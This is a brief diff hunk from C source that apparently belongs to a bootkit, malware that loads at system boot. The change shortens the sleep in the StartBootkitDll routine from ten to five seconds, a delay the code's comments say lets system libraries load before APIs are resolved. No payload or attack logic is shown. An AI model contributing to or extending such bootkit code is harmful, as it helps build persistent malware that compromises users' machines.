@@ -576,7 +576,7 @@ void StartBootkitDll(void* Arguments)
 	// Waiting helps system to load all libraries in default load order. After loading all modules 
 	// we can apply GetApi for our reasons.
 
-	DWORD timeout = 10 * 1000;
+	DWORD timeout = 5 * 1000;
 	
 	LDRDBG("StartBootkitDll", "Sleeping %d ms.", timeout);
 	pSleep(timeout);
